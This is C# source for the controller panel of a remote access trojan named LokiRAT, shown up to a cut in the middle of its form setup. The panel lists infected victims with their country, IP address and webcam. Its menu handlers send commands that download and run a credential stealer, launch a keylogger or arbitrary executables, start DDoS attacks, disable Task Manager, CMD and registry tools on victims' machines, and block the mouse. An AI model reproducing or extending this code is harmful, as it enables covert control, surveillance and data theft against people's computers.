namespace LokiRAT_Server
{
    using LokiRAT_Client;
    using Microsoft.Win32;
    using SkinSoft.OSSkin;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class main : Form
    {
        private ToolStripMenuItem adminToolStripMenuItem;
        private string[,] botsA = new string[0x270f, 15];
        private ToolStripMenuItem botToolStripMenuItem;
        private ToolStripMenuItem builderToolStripMenuItem;
        private ToolStripMenuItem cDROMToolStripMenuItem;
        private ToolStripMenuItem clearAllToolStripMenuItem1;
        private ToolStripMenuItem clearFromDatabaseToolStripMenuItem;
        private ToolStripMenuItem clipboardToolStripMenuItem;
        private ToolStripMenuItem closeToolStripMenuItem;
        private ToolStripMenuItem closeToolStripMenuItem1;
        private ToolStripMenuItem closeToolStripMenuItem2;
        private ToolStripMenuItem cMDToolStripMenuItem;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader4;
        private ColumnHeader columnHeader5;
        private ColumnHeader columnHeader6;
        private ColumnHeader columnHeader7;
        private ColumnHeader columnHeader8;
        private IContainer components = null;
        private ToolStripMenuItem computerToolStripMenuItem;
        public static string connectionPass;
        private ToolStripMenuItem connectionToolStripMenuItem;
        public static string connectionURL;
        private ToolStripMenuItem connectiToolStripMenuItem;
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem crazyKeyboardToolStripMenuItem;
        public static string currentID;
        private ToolStripMenuItem dDosToolStripMenuItem;
        private ToolStripMenuItem deleteFromDatabaseToolStripMenuItem;
        private ToolStripMenuItem deleteFromListToolStripMenuItem;
        private ToolStripMenuItem disableToolStripMenuItem;
        private ToolStripMenuItem disableToolStripMenuItem1;
        private ToolStripMenuItem disableToolStripMenuItem2;
        private ToolStripMenuItem disableToolStripMenuItem3;
        private ToolStripMenuItem disconnectToolStripMenuItem;
        private ToolStripMenuItem doNotRunNextComputerStartToolStripMenuItem;
        private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;
        private ToolStripMenuItem downloadAndRunKeyloggerToolStripMenuItem;
        private ToolStripMenuItem downloadAndRunStealerToolStripMenuItem;
        private ToolStripMenuItem enableToolStripMenuItem;
        private ToolStripMenuItem enableToolStripMenuItem1;
        private ToolStripMenuItem enableToolStripMenuItem2;
        private ToolStripMenuItem enableToolStripMenuItem3;
        public static string enadis = "0";
        private ToolStripMenuItem fakeMessageToolStripMenuItem;
        private ToolStripMenuItem fileManagerToolStripMenuItem;
        private ToolStripMenuItem funnyToolStripMenuItem;
        private ToolStripMenuItem hibernationToolStripMenuItem;
        private ToolStripMenuItem hideToolStripMenuItem;
        private ToolStripMenuItem hideToolStripMenuItem1;
        private ToolStripMenuItem iconsToolStripMenuItem;
        private ImageList imageList1;
        private ToolStripMenuItem informationToolStripMenuItem;
        private ToolStripMenuItem keyboardToolStripMenuItem;
        private Label label1;
        private Label label10;
        private Label label11;
        private Label label12;
        private Label label13;
        private Label label14;
        private Label label15;
        private Label label16;
        private Label label17;
        private Label label18;
        private Label label19;
        private Label label2;
        private Label label20;
        private Label label3;
        private Label label4;
        private Label label5;
        private Label label6;
        private Label label7;
        private Label label8;
        private Label label9;
        public static string[] lastCommand = new string[0x270f];
        public static string[] lastCommandText = new string[0x270f];
        private ListBox listBox1;
        private ListView listView1;
        private ToolStripMenuItem logOffToolStripMenuItem;
        private MenuStrip menuStrip1;
        private ToolStripMenuItem monitorToolStripMenuItem;
        private int numBots = 0;
        private ToolStripMenuItem offToolStripMenuItem;
        private ToolStripMenuItem oNToolStripMenuItem;
        private ToolStripMenuItem openToolStripMenuItem;
        private ToolStripMenuItem openToolStripMenuItem1;
        private SkinSoft.OSSkin.OSSkin osSkin = new SkinSoft.OSSkin.OSSkin();
        private ToolStripMenuItem otherCDROMLetterToolStripMenuItem;
        private PictureBox pictureBox1;
        private ToolStripMenuItem printToolStripMenuItem;
        private ToolStripMenuItem processManagerToolStripMenuItem;
        private ToolStripMenuItem programManagerToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private ToolStripMenuItem regeditToolStripMenuItem;
        private ToolStripMenuItem registryManagerToolStripMenuItem;
        private ToolStripMenuItem registryToolStripMenuItem;
        private ToolStripMenuItem reloadToolStripMenuItem1;
        private ToolStripMenuItem restartToolStripMenuItem;
        private ToolStripMenuItem screenshootToolStripMenuItem;
        private ToolStripMenuItem scriptToolStripMenuItem;
        public static int selectedBot;
        private ToolStripMenuItem showToolStripMenuItem;
        private ToolStripMenuItem showToolStripMenuItem1;
        private ToolStripMenuItem shutdownToolStripMenuItem;
        private ToolStripMenuItem startToolStripMenuItem;
        public static string stealerURL;
        private ToolStripMenuItem stopToolStripMenuItem;
        private TabControl tabControl1;
        private TabPage tabPage1;
        private TabPage tabPage2;
        private TabPage tabPage3;
        private ToolStripMenuItem taskbarToolStripMenuItem;
        private ToolStripMenuItem taskManagerToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Timer timer2;
        private ToolStripComboBox toolStripComboBox1;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripSeparator toolStripSeparator3;
        private ToolStripSeparator toolStripSeparator4;
        private ToolStripSeparator toolStripSeparator5;
        private ToolStripSeparator toolStripSeparator6;
        private ToolStripSeparator toolStripSeparator7;
        private ToolStripMenuItem uninstallToolStripMenuItem;
        public static string userAgent;
        private ToolStripMenuItem visitPageToolStripMenuItem;
        private WebClient wbt = new WebClient();
        private ToolStripMenuItem webcamToolStripMenuItem;

        public main()
        {
            this.InitializeComponent();
            this.InitializeForm();
        }

        private void adminToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new configuration().ShowDialog();
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new builder().ShowDialog();
        }

        private void clearAllToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
        }

        private void clearFromDatabaseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listBox1.Items.Add(loadPage("type=delete"));
            this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
            this.listView1.Items.Clear();
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
        }

        private void clipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new clipboard().ShowDialog();
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=close");
        }

        private void closeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=cdrom|close|E");
        }

        private void closeToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=cdrom|close|" + this.toolStripComboBox1.Text);
        }

        private void connectiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listBox1.Items.Add(loadPage("type=connect"));
            this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
            this.label18.Text = "Connected";
        }

        private void dDosToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new ddos().ShowDialog();
        }

        private void deleteFromDatabaseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=delete");
            this.loadBots();
        }

        private void deleteFromListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Remove(this.listView1.SelectedItems[0]);
        }

        private void disableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=mouse|enable");
        }

        private void disableToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableTaskMgr|1");
        }

        private void disableToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableCMD|1");
        }

        private void disableToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableRegistryTools|0");
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listBox1.Items.Add(loadPage("type=disconnect"));
            this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
            this.label18.Text = "Disconnected";
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void doNotRunNextComputerStartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regdel");
        }

        private void downloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new execute().ShowDialog();
        }

        private void downloadAndRunKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new keylogger().ShowDialog();
        }

        private void downloadAndRunStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=downloadexe|" + stealerURL);
        }

        private void enableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=mouse|disable");
        }

        private void enableToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableTaskMgr|0");
        }

        private void enableToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableCMD|0");
        }

        private void enableToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=regnewkey|Software//Microsoft//Windows//CurrentVersion//Policies//System|DisableRegistryTools|0");
        }

        private void fakeMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new message().ShowDialog();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                int num = this.listView1.SelectedIndices[0];
                new fileManager().ShowDialog();
            }
            catch
            {
                MessageBox.Show("You must select bot first!", "Select bot | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void hibernationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=computer|shutdown|/h /t 0");
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=icons|hide");
        }

        private void hideToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=taskbar|hide");
        }

        private void informationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.osSkin.BeginUpdate();
            this.osSkin.Style = SkinStyle.Office2007Blue;
            this.osSkin.EndUpdate();
            new about().ShowDialog();
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ListViewGroup group = new ListViewGroup("ListViewGroup", HorizontalAlignment.Left);
            ComponentResourceManager manager = new ComponentResourceManager(typeof(main));
            this.listView1 = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.columnHeader4 = new ColumnHeader();
            this.columnHeader6 = new ColumnHeader();
            this.columnHeader8 = new ColumnHeader();
            this.columnHeader5 = new ColumnHeader();
            this.columnHeader7 = new ColumnHeader();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.fileManagerToolStripMenuItem = new ToolStripMenuItem();
            this.processManagerToolStripMenuItem = new ToolStripMenuItem();
            this.programManagerToolStripMenuItem = new ToolStripMenuItem();
            this.registryManagerToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator2 = new ToolStripSeparator();
            this.funnyToolStripMenuItem = new ToolStripMenuItem();
            this.fakeMessageToolStripMenuItem = new ToolStripMenuItem();
            this.printToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator6 = new ToolStripSeparator();
            this.cDROMToolStripMenuItem = new ToolStripMenuItem();
            this.openToolStripMenuItem = new ToolStripMenuItem();
            this.closeToolStripMenuItem1 = new ToolStripMenuItem();
            this.otherCDROMLetterToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripComboBox1 = new ToolStripComboBox();
            this.openToolStripMenuItem1 = new ToolStripMenuItem();
            this.closeToolStripMenuItem2 = new ToolStripMenuItem();
            this.monitorToolStripMenuItem = new ToolStripMenuItem();
            this.oNToolStripMenuItem = new ToolStripMenuItem();
            this.offToolStripMenuItem = new ToolStripMenuItem();
            this.iconsToolStripMenuItem = new ToolStripMenuItem();
            this.showToolStripMenuItem = new ToolStripMenuItem();
            this.hideToolStripMenuItem = new ToolStripMenuItem();
            this.taskbarToolStripMenuItem = new ToolStripMenuItem();
            this.showToolStripMenuItem1 = new ToolStripMenuItem();
            this.hideToolStripMenuItem1 = new ToolStripMenuItem();
            this.keyboardToolStripMenuItem = new ToolStripMenuItem();
            this.enableToolStripMenuItem = new ToolStripMenuItem();
            this.disableToolStripMenuItem = new ToolStripMenuItem();
            this.crazyKeyboardToolStripMenuItem = new ToolStripMenuItem();
            this.startToolStripMenuItem = new ToolStripMenuItem();
            this.stopToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator5 = new ToolStripSeparator();
            this.screenshootToolStripMenuItem = new ToolStripMenuItem();
            this.webcamToolStripMenuItem = new ToolStripMenuItem();
            this.registryToolStripMenuItem = new ToolStripMenuItem();
            this.taskManagerToolStripMenuItem = new ToolStripMenuItem();
            this.enableToolStripMenuItem1 = new ToolStripMenuItem();
            this.disableToolStripMenuItem1 = new ToolStripMenuItem();
            this.cMDToolStripMenuItem = new ToolStripMenuItem();
            this.enableToolStripMenuItem2 = new ToolStripMenuItem();
            this.disableToolStripMenuItem2 = new ToolStripMenuItem();
            this.regeditToolStripMenuItem = new ToolStripMenuItem();
            this.enableToolStripMenuItem3 = new ToolStripMenuItem();
            this.disableToolStripMenuItem3 = new ToolStripMenuItem();
            this.computerToolStripMenuItem = new ToolStripMenuItem();
            this.shutdownToolStripMenuItem = new ToolStripMenuItem();
            this.restartToolStripMenuItem = new ToolStripMenuItem();
            this.logOffToolStripMenuItem = new ToolStripMenuItem();
            this.hibernationToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator4 = new ToolStripSeparator();
            this.clipboardToolStripMenuItem = new ToolStripMenuItem();
            this.downloadAndExecuteToolStripMenuItem = new ToolStripMenuItem();
            this.scriptToolStripMenuItem = new ToolStripMenuItem();
            this.dDosToolStripMenuItem = new ToolStripMenuItem();
            this.visitPageToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator3 = new ToolStripSeparator();
            this.downloadAndRunStealerToolStripMenuItem = new ToolStripMenuItem();
            this.downloadAndRunKeyloggerToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.botToolStripMenuItem = new ToolStripMenuItem();
            this.doNotRunNextComputerStartToolStripMenuItem = new ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new ToolStripMenuItem();
            this.closeToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator7 = new ToolStripSeparator();
            this.deleteFromListToolStripMenuItem = new ToolStripMenuItem();
            this.deleteFromDatabaseToolStripMenuItem = new ToolStripMenuItem();
            this.imageList1 = new ImageList(this.components);
            this.menuStrip1 = new MenuStrip();
            this.adminToolStripMenuItem = new ToolStripMenuItem();
            this.connectionToolStripMenuItem = new ToolStripMenuItem();
            this.connectiToolStripMenuItem = new ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new ToolStripMenuItem();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.reloadToolStripMenuItem1 = new ToolStripMenuItem();
            this.clearAllToolStripMenuItem1 = new ToolStripMenuItem();
            this.clearFromDatabaseToolStripMenuItem = new ToolStripMenuItem();
            this.builderToolStripMenuItem = new ToolStripMenuItem();
            this.informationToolStripMenuItem = new ToolStripMenuItem();
            this.listBox1 = new ListBox();
            this.label13 = new Label();
            this.label12 = new Label();
            this.label10 = new Label();
            this.label4 = new Label();
            this.label3 = new Label();
            this.label1 = new Label();
            this.pictureBox1 = new PictureBox();
            this.label18 = new Label();
            this.label17 = new Label();
            this.label16 = new Label();
            this.label15 = new Label();
            this.label14 = new Label();
            this.label9 = new Label();
            this.label5 = new Label();
            this.label6 = new Label();
            this.label7 = new Label();
            this.label8 = new Label();
            this.tabControl1 = new TabControl();
            this.tabPage1 = new TabPage();
            this.tabPage2 = new TabPage();
            this.label11 = new Label();
            this.label2 = new Label();
            this.tabPage3 = new TabPage();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.label19 = new Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label20 = new Label();
            this.contextMenuStrip1.SuspendLayout();
            this.menuStrip1.SuspendLayout();
            ((ISupportInitialize) this.pictureBox1).BeginInit();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            base.SuspendLayout();
            this.listView1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.listView1.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader6, this.columnHeader8, this.columnHeader5, this.columnHeader7 });
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            group.Header = "ListViewGroup";
            group.Name = "listViewGroup1";
            this.listView1.Groups.AddRange(new ListViewGroup[] { group });
            this.listView1.HideSelection = false;
            this.listView1.Location = new Point(0, 0x18);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new Size(0x3c5, 0x14d);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.listView1.SelectedIndexChanged += new EventHandler(this.listView1_SelectedIndexChanged);
            this.columnHeader1.Text = "ID";
            this.columnHeader1.Width = 0x6f;
            this.columnHeader2.Text = "Country";
            this.columnHeader2.Width = 0x63;
            this.columnHeader3.Text = "PC Name";
            this.columnHeader3.Width = 0x85;
            this.columnHeader4.Text = "Operating System";
            this.columnHeader4.Width = 0x89;
            this.columnHeader6.Text = "IP Address";
            this.columnHeader6.Width = 0x80;
            this.columnHeader8.Text = "Webcam";
            this.columnHeader8.Width = 0x57;
            this.columnHeader5.Text = "RAM";
            this.columnHeader5.Width = 0x71;
            this.columnHeader7.Text = "Processor";
            this.columnHeader7.Width = 0x99;
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { 
                this.fileManagerToolStripMenuItem, this.processManagerToolStripMenuItem, this.programManagerToolStripMenuItem, this.registryManagerToolStripMenuItem, this.toolStripSeparator2, this.funnyToolStripMenuItem, this.toolStripSeparator5, this.screenshootToolStripMenuItem, this.webcamToolStripMenuItem, this.registryToolStripMenuItem, this.computerToolStripMenuItem, this.toolStripSeparator4, this.clipboardToolStripMenuItem, this.downloadAndExecuteToolStripMenuItem, this.scriptToolStripMenuItem, this.dDosToolStripMenuItem, 
                this.visitPageToolStripMenuItem, this.toolStripSeparator3, this.downloadAndRunStealerToolStripMenuItem, this.downloadAndRunKeyloggerToolStripMenuItem, this.toolStripSeparator1, this.botToolStripMenuItem
             });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(0xe2, 430);
            this.fileManagerToolStripMenuItem.Image = (Image) manager.GetObject("fileManagerToolStripMenuItem.Image");
            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
            this.fileManagerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.fileManagerToolStripMenuItem.Text = "File Manager";
            this.fileManagerToolStripMenuItem.Click += new EventHandler(this.fileManagerToolStripMenuItem_Click);
            this.processManagerToolStripMenuItem.Image = (Image) manager.GetObject("processManagerToolStripMenuItem.Image");
            this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
            this.processManagerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.processManagerToolStripMenuItem.Text = "Process Manager";
            this.processManagerToolStripMenuItem.Click += new EventHandler(this.processManagerToolStripMenuItem_Click);
            this.programManagerToolStripMenuItem.Image = (Image) manager.GetObject("programManagerToolStripMenuItem.Image");
            this.programManagerToolStripMenuItem.Name = "programManagerToolStripMenuItem";
            this.programManagerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.programManagerToolStripMenuItem.Text = "Program Manager";
            this.programManagerToolStripMenuItem.Click += new EventHandler(this.programManagerToolStripMenuItem_Click);
            this.registryManagerToolStripMenuItem.Image = (Image) manager.GetObject("registryManagerToolStripMenuItem.Image");
            this.registryManagerToolStripMenuItem.Name = "registryManagerToolStripMenuItem";
            this.registryManagerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.registryManagerToolStripMenuItem.Text = "Registry Manager";
            this.registryManagerToolStripMenuItem.Click += new EventHandler(this.registryManagerToolStripMenuItem_Click);
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new Size(0xde, 6);
            this.funnyToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.fakeMessageToolStripMenuItem, this.printToolStripMenuItem, this.toolStripSeparator6, this.cDROMToolStripMenuItem, this.monitorToolStripMenuItem, this.iconsToolStripMenuItem, this.taskbarToolStripMenuItem, this.keyboardToolStripMenuItem, this.crazyKeyboardToolStripMenuItem });
            this.funnyToolStripMenuItem.Image = (Image) manager.GetObject("funnyToolStripMenuItem.Image");
            this.funnyToolStripMenuItem.Name = "funnyToolStripMenuItem";
            this.funnyToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.funnyToolStripMenuItem.Text = "Funny Stuff";
            this.fakeMessageToolStripMenuItem.Image = (Image) manager.GetObject("fakeMessageToolStripMenuItem.Image");
            this.fakeMessageToolStripMenuItem.Name = "fakeMessageToolStripMenuItem";
            this.fakeMessageToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.fakeMessageToolStripMenuItem.Text = "Fake Message";
            this.fakeMessageToolStripMenuItem.Click += new EventHandler(this.fakeMessageToolStripMenuItem_Click);
            this.printToolStripMenuItem.Image = (Image) manager.GetObject("printToolStripMenuItem.Image");
            this.printToolStripMenuItem.Name = "printToolStripMenuItem";
            this.printToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.printToolStripMenuItem.Text = "Print";
            this.printToolStripMenuItem.Click += new EventHandler(this.printToolStripMenuItem_Click);
            this.toolStripSeparator6.Name = "toolStripSeparator6";
            this.toolStripSeparator6.Size = new Size(0x99, 6);
            this.cDROMToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.openToolStripMenuItem, this.closeToolStripMenuItem1, this.otherCDROMLetterToolStripMenuItem });
            this.cDROMToolStripMenuItem.Image = (Image) manager.GetObject("cDROMToolStripMenuItem.Image");
            this.cDROMToolStripMenuItem.Name = "cDROMToolStripMenuItem";
            this.cDROMToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.cDROMToolStripMenuItem.Text = "CD ROM";
            this.openToolStripMenuItem.Image = (Image) manager.GetObject("openToolStripMenuItem.Image");
            this.openToolStripMenuItem.Name = "openToolStripMenuItem";
            this.openToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.openToolStripMenuItem.Text = "Open";
            this.openToolStripMenuItem.Click += new EventHandler(this.openToolStripMenuItem_Click);
            this.closeToolStripMenuItem1.Image = (Image) manager.GetObject("closeToolStripMenuItem1.Image");
            this.closeToolStripMenuItem1.Name = "closeToolStripMenuItem1";
            this.closeToolStripMenuItem1.Size = new Size(0x89, 0x16);
            this.closeToolStripMenuItem1.Text = "Close";
            this.closeToolStripMenuItem1.Click += new EventHandler(this.closeToolStripMenuItem1_Click);
            this.otherCDROMLetterToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.toolStripComboBox1, this.openToolStripMenuItem1, this.closeToolStripMenuItem2 });
            this.otherCDROMLetterToolStripMenuItem.Image = (Image) manager.GetObject("otherCDROMLetterToolStripMenuItem.Image");
            this.otherCDROMLetterToolStripMenuItem.Name = "otherCDROMLetterToolStripMenuItem";
            this.otherCDROMLetterToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.otherCDROMLetterToolStripMenuItem.Text = "Other Letter";
            this.toolStripComboBox1.Items.AddRange(new object[] { "C", "D", "E", "F", "G", "H" });
            this.toolStripComboBox1.Name = "toolStripComboBox1";
            this.toolStripComboBox1.Size = new Size(0x79, 0x17);
            this.toolStripComboBox1.Text = "E";
            this.openToolStripMenuItem1.Image = (Image) manager.GetObject("openToolStripMenuItem1.Image");
            this.openToolStripMenuItem1.Name = "openToolStripMenuItem1";
            this.openToolStripMenuItem1.Size = new Size(0xb5, 0x16);
            this.openToolStripMenuItem1.Text = "Open";
            this.openToolStripMenuItem1.Click += new EventHandler(this.openToolStripMenuItem1_Click);
            this.closeToolStripMenuItem2.Image = (Image) manager.GetObject("closeToolStripMenuItem2.Image");
            this.closeToolStripMenuItem2.Name = "closeToolStripMenuItem2";
            this.closeToolStripMenuItem2.Size = new Size(0xb5, 0x16);
            this.closeToolStripMenuItem2.Text = "Close";
            this.closeToolStripMenuItem2.Click += new EventHandler(this.closeToolStripMenuItem2_Click);
            this.monitorToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.oNToolStripMenuItem, this.offToolStripMenuItem });
            this.monitorToolStripMenuItem.Image = (Image) manager.GetObject("monitorToolStripMenuItem.Image");
            this.monitorToolStripMenuItem.Name = "monitorToolStripMenuItem";
            this.monitorToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.monitorToolStripMenuItem.Text = "Monitor";
            this.oNToolStripMenuItem.Image = (Image) manager.GetObject("oNToolStripMenuItem.Image");
            this.oNToolStripMenuItem.Name = "oNToolStripMenuItem";
            this.oNToolStripMenuItem.Size = new Size(0x5b, 0x16);
            this.oNToolStripMenuItem.Text = "On";
            this.oNToolStripMenuItem.Click += new EventHandler(this.oNToolStripMenuItem_Click);
            this.offToolStripMenuItem.Image = (Image) manager.GetObject("offToolStripMenuItem.Image");
            this.offToolStripMenuItem.Name = "offToolStripMenuItem";
            this.offToolStripMenuItem.Size = new Size(0x5b, 0x16);
            this.offToolStripMenuItem.Text = "Off";
            this.offToolStripMenuItem.Click += new EventHandler(this.offToolStripMenuItem_Click);
            this.iconsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.showToolStripMenuItem, this.hideToolStripMenuItem });
            this.iconsToolStripMenuItem.Image = (Image) manager.GetObject("iconsToolStripMenuItem.Image");
            this.iconsToolStripMenuItem.Name = "iconsToolStripMenuItem";
            this.iconsToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.iconsToolStripMenuItem.Text = "Icons";
            this.showToolStripMenuItem.Image = (Image) manager.GetObject("showToolStripMenuItem.Image");
            this.showToolStripMenuItem.Name = "showToolStripMenuItem";
            this.showToolStripMenuItem.Size = new Size(0x67, 0x16);
            this.showToolStripMenuItem.Text = "Show";
            this.showToolStripMenuItem.Click += new EventHandler(this.showToolStripMenuItem_Click);
            this.hideToolStripMenuItem.Image = (Image) manager.GetObject("hideToolStripMenuItem.Image");
            this.hideToolStripMenuItem.Name = "hideToolStripMenuItem";
            this.hideToolStripMenuItem.Size = new Size(0x67, 0x16);
            this.hideToolStripMenuItem.Text = "Hide";
            this.hideToolStripMenuItem.Click += new EventHandler(this.hideToolStripMenuItem_Click);
            this.taskbarToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.showToolStripMenuItem1, this.hideToolStripMenuItem1 });
            this.taskbarToolStripMenuItem.Image = (Image) manager.GetObject("taskbarToolStripMenuItem.Image");
            this.taskbarToolStripMenuItem.Name = "taskbarToolStripMenuItem";
            this.taskbarToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.taskbarToolStripMenuItem.Text = "Taskbar";
            this.showToolStripMenuItem1.Image = (Image) manager.GetObject("showToolStripMenuItem1.Image");
            this.showToolStripMenuItem1.Name = "showToolStripMenuItem1";
            this.showToolStripMenuItem1.Size = new Size(0x67, 0x16);
            this.showToolStripMenuItem1.Text = "Show";
            this.showToolStripMenuItem1.Click += new EventHandler(this.showToolStripMenuItem1_Click);
            this.hideToolStripMenuItem1.Image = (Image) manager.GetObject("hideToolStripMenuItem1.Image");
            this.hideToolStripMenuItem1.Name = "hideToolStripMenuItem1";
            this.hideToolStripMenuItem1.Size = new Size(0x67, 0x16);
            this.hideToolStripMenuItem1.Text = "Hide";
            this.hideToolStripMenuItem1.Click += new EventHandler(this.hideToolStripMenuItem1_Click);
            this.keyboardToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.enableToolStripMenuItem, this.disableToolStripMenuItem });
            this.keyboardToolStripMenuItem.Image = (Image) manager.GetObject("keyboardToolStripMenuItem.Image");
            this.keyboardToolStripMenuItem.Name = "keyboardToolStripMenuItem";
            this.keyboardToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.keyboardToolStripMenuItem.Text = "Mouse";
            this.enableToolStripMenuItem.Image = (Image) manager.GetObject("enableToolStripMenuItem.Image");
            this.enableToolStripMenuItem.Name = "enableToolStripMenuItem";
            this.enableToolStripMenuItem.Size = new Size(0x76, 0x16);
            this.enableToolStripMenuItem.Text = "Unblock";
            this.enableToolStripMenuItem.Click += new EventHandler(this.enableToolStripMenuItem_Click);
            this.disableToolStripMenuItem.Image = (Image) manager.GetObject("disableToolStripMenuItem.Image");
            this.disableToolStripMenuItem.Name = "disableToolStripMenuItem";
            this.disableToolStripMenuItem.Size = new Size(0x76, 0x16);
            this.disableToolStripMenuItem.Text = "Block";
            this.disableToolStripMenuItem.Click += new EventHandler(this.disableToolStripMenuItem_Click);
